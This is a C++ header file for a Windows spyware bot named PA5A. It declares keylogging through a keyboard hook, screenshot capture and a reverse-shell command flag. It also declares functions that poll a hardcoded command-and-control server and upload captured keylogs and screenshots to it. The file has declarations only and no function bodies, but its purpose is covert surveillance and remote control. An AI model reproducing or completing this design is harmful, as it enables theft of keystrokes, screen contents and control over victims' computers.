#ifndef PA5A_HPP
#define PA5A_HPP

#include <Windows.h>
#include <WinInet.h>
#include <Psapi.h>
#include <gdiplus.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strsafe.h>
#include <time.h>

#include <cjson/cJSON.h>
#include "utils.hpp"

#pragma comment(lib, "crypt32")
#pragma comment(lib, "gdiplus")
#pragma comment(lib, "wininet")

EXTERN_C_START

struct Commands
{
	BOOL keylogs;
	BOOL screenshot;
	BOOL reverseShell;
};

//Pour afficher les informations de debogage
#define DEBUG
//#pragma warning(disable : 4996)

#define DATA_FOLDER_A		"C:\\ProgramData\\PA5A\\"
#define DATA_FOLDER_W		L"C:\\ProgramData\\PA5A\\"
#define SCREENSHOT_FILE_W	L"screenshot.jpeg"
#define SERVER_NAME_A		"pa5a.cyberfilou.site"
#define SERVER_NAME_W		L"pa5a.cyberfilou.site"
#define USER_AGENT_A		"PA5A-BOT"
#define USER_AGENT_W		L"PA5A-BOT"
#define HTTP_PORT			80
#define HTTPS_PORT			443
#define CLIENT_API_A		"/api/clients/"
#define COMMANDS_API_A		"/commands"
#define KEYLOGS_API_A		"/keylogs"
#define SCREENSHOT_API_A	"/screenshot"
#define PATH_SIZE			2048
#define URL_SIZE			4096
#define UUID_SIZE			256
#define COMPUTER_NAME_SIZE	256

typedef struct Commands Commands;

/********************************************************************************************************************************************************/
//main.cpp
INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, INT nCmdShow);
DWORD ThreadProcPolling(HANDLE param);
/********************************************************************************************************************************************************/
//http.cpp
VOID GenerateBoundary(LPSTR buffer, SIZE_T size);
Commands GetCommands(LPCSTR server, DWORD port);
BOOL SendJsonDataByHttps(LPCSTR server, DWORD port, LPCSTR url, LPCSTR method, LPCSTR userAgent, LPCSTR jsonData);
BOOL SendClientInformations();
BOOL WINAPI http_upload_file(LPCSTR server, DWORD port, LPCSTR script, LPCSTR szParam, LPCSTR szValue, LPCWSTR filenameW);
/********************************************************************************************************************************************************/
//Keylogger.cpp
LRESULT WINAPI HookProc(int code, WPARAM wParam, LPARAM lParam);
VOID WriteLogs(PWCHAR logsUnicode, PWCHAR appNameUnicode, PWCHAR pathUnicode);
cJSON* CreateJsonLogsObject(PCHAR logs, PCHAR app, PCHAR path);
VOID WriteJsonObjectLogs(cJSON* newJsonObject);
/********************************************************************************************************************************************************/
int GetUuid(char* uuid);



BOOL SendJsonDataByHttps(LPCSTR server, DWORD port, LPCSTR url, LPCSTR method, LPCSTR userAgent, LPCSTR jsonData);


//screenshot.cpp
INT WINAPI GetEncoderClsid(LPCWSTR format, CLSID* pClsid);
BOOL WINAPI SaveScreenshot(LPCWSTR filename);


//utils.cpp
//uuid.cpp

EXTERN_C_END

#endif // PA5A_HPP
